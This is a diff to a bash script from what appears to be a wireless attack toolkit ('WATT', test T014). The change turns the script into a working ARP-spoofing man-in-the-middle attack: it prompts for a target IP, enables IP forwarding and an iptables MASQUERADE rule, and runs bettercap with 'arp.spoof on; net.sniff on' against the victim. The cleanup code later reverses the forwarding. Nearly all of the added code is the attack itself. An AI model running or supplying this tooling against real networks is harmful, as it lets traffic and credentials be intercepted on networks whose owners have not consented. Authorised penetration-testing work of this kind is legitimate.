@@ -41,6 +41,12 @@ cleanup() {
     print_info "Starting cleanup"
     rm -f /tmp/watt_attack_active
 
+    # Stop ARP spoofing & reset forwarding rules
+    print_action "Disabling IP forwarding and removing NAT rule"
+    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null
+    sudo iptables -t nat -D POSTROUTING -o ens33 -j MASQUERADE
+    print_success "IP forwarding and NAT rule removed"
+
     # Check mode
     MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
     if [[ "$MODE" != "managed" ]]; then
@@ -57,7 +63,7 @@ trap cleanup EXIT
 trap cleanup SIGINT
 
 # Validate config vars
-if [[ -z "$INTERFACE" || -z "$T014_TARGET_IP"; then
+if [[ -z "$INTERFACE" || -z "$T014_TARGET_IP" ]]; then
     print_warn "Required variables not defined in config.sh: INTERFACE or T014_TARGET_IP"
     exit 0
 fi
@@ -69,7 +75,7 @@ echo "Target IP    : $T014_TARGET_IP"
 print_blank
 
 # Confirm attack
-print_prompt "Proceed with attack? (y/N): "
+print_prompt "Proceed to attack configuration? (y/N): "
 read -r confirm
 
 if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
@@ -91,6 +97,29 @@ while true; do
     fi
 done
 
+# Input IP address
+while true; do
+    print_prompt "Target IP address [default: ${T014_TARGET_IP}]: "
+    read -r TARGET_IP
+
+    TARGET_IP="${TARGET_IP:-$T014_TARGET_IP}"
+    
+    if [[ "$TARGET_IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+        break
+    else
+        print_fail "Invalid input. Enter a valid IP address (format: XXX.XXX.XXX.XXX)"
+    fi
+done
+
+# Confirm AP association
+print_prompt "Is WATT connected to the target AP? (y/N): "
+read -r confirm
+
+if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
+    print_warn "Connect WATT to the target AP"
+    exit 0
+fi
+
 # Launch attack
 echo "T014" > /tmp/watt_attack_active
 print_blank
@@ -98,16 +127,23 @@ print_info "Starting Attack"
 
 # Check mode
 MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
-if [[ "$MODE" != "monitor" ]]; then
-    print_action "Enabling Monitor mode"
-    bash "$SCRIPT_DIR/set-mode-monitor.sh"
-    print_success "Interface set to Monitor mode"
+if [[ "$MODE" != "managed" ]]; then
+    print_action "Enabling Managed mode"
+    bash "$SCRIPT_DIR/set-mode-managed.sh"
+    print_success "Interface set to Managed mode"
 fi
+
+# Enabled IP forwarding and NAT
+print_action "Enabling IP forwarding and NAT on $INTERFACE → ens33"
+sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
+sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
+print_success "IP forwarding and NAT rule added"
 
 # Run attack
 print_blank
 print_info "Running T014 - ARP Spoofing attack for $DURATION seconds"
-sudo timeout "$DURATION" airbase-ng -e "$T016_PROBE_SSID" -c "$T016_PROBE_CHANNEL" -a "$T016_PROBE_BSSID" "$INTERFACE"
+print_blank
+sudo timeout "$DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on"
 
 EXIT_CODE=$?
 
